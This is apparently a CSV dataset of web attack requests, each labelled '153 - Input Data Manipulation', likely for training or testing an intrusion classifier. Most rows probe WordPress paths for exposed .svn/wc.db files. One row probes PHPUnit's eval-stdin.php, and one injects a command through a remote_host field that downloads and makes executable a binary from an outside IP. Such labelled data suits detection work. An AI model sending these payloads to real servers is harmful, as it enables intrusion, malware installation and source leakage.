text,label
"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php <?=md5(""phpunit"")?>",153 - Input Data Manipulation
POST /cgi-bin/ViewLog.asp  remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://45.95.168.230/taevimncorufglbzhwxqpdkjs/Meth.arm7;chmod+777+Meth,153 - Input Data Manipulation
GET /.svn/wc.db,153 - Input Data Manipulation
GET /blog/.svn/wc.db,153 - Input Data Manipulation
GET /blog/index.php/my-account/.svn/wc.db,153 - Input Data Manipulation
GET /blog/index.php/.svn/wc.db,153 - Input Data Manipulation
GET /blog/index.php/my-account/lost-password/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/plugins/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/plugins/user-registration/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/plugins/user-registration/assets/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/plugins/user-registration/assets/css/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/plugins/user-registration/assets/css/sweetalert2/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/plugins/user-registration/assets/js/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/plugins/user-registration/assets/js/frontend/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/plugins/user-registration/assets/js/inputmask/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/plugins/user-registration/assets/js/jquery-tiptip/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/themes/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/themes/twentyseventeen/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/themes/twentyseventeen/assets/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/themes/twentyseventeen/assets/js/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/uploads/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-content/uploads/2020/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-includes/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-includes/css/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-includes/js/.svn/wc.db,153 - Input Data Manipulation
GET /blog/wp-includes/js/jquery/.svn/wc.db,153 - Input Data Manipulation
GET /.svn/wc.db,153 - Input Data Manipulation
GET /.git/.svn/wc.db,153 - Input Data Manipulation
GET /.well-known/.svn/wc.db,153 - Input Data Manipulation
GET /blog/.svn/wc.db,153 - Input Data Manipulation
GET /blog/.git/.svn/wc.db,153 - Input Data Manipulation
GET /blog/index.php/.svn/wc.db,153 - Input Data Manipulation
